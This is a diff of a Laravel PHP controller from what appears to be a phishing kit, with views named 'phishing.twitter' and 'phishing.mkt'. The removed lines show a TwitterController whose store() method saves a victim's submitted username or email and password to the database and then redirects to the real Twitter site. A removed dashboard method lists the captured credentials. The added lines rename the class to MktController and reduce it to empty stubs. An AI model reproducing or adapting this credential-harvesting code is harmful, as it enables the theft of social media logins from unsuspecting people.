@@ -2,10 +2,10 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\Twitter;
+use App\Models\Mkt;
 use Illuminate\Http\Request;
 
-class TwitterController extends Controller
+class MktController extends Controller
 {
     /**
      * Display a listing of the resource.
@@ -14,7 +14,7 @@ class TwitterController extends Controller
      */
     public function index()
     {
-        return view('phishing.mkt.index');
+        return view('phishing.twitter.index');
     }
 
     /**
@@ -35,23 +35,16 @@ class TwitterController extends Controller
      */
     public function store(Request $request)
     {
-        $dataTwitter = new Twitter();
-
-        $dataTwitter->usernameOrEmail = $request->usernameOrEmail;
-        $dataTwitter->password = $request->password;
-        
-        $dataTwitter->save();
-
-        return redirect('https://twitter.com/');
+        //
     }
 
     /**
      * Display the specified resource.
      *
-     * @param  \App\Models\Twitter  $twitter
+     * @param  int  $id
      * @return \Illuminate\Http\Response
      */
-    public function show(Twitter $twitter)
+    public function show($id)
     {
         //
     }
@@ -59,10 +52,10 @@ class TwitterController extends Controller
     /**
      * Show the form for editing the specified resource.
      *
-     * @param  \App\Models\Twitter  $twitter
+     * @param  int  $id
      * @return \Illuminate\Http\Response
      */
-    public function edit(Twitter $twitter)
+    public function edit($id)
     {
         //
     }
@@ -71,10 +64,10 @@ class TwitterController extends Controller
      * Update the specified resource in storage.
      *
      * @param  \Illuminate\Http\Request  $request
-     * @param  \App\Models\Twitter  $twitter
+     * @param  int  $id
      * @return \Illuminate\Http\Response
      */
-    public function update(Request $request, Twitter $twitter)
+    public function update(Request $request, $id)
     {
         //
     }
@@ -82,19 +75,11 @@ class TwitterController extends Controller
     /**
      * Remove the specified resource from storage.
      *
-     * @param  \App\Models\Twitter  $twitter
+     * @param  int  $id
      * @return \Illuminate\Http\Response
      */
-    public function destroy(Twitter $twitter)
+    public function destroy($id)
     {
         //
     }
-
-    public function dashboardTwitter()
-    {
-        $dataTwitter = Twitter::orderBy('id', 'DESC')->paginate();
-        //dd($dataTwitter);
-        return view('phishing.twitter.dashboard', compact('dataTwitter'));
-    }
-
 }
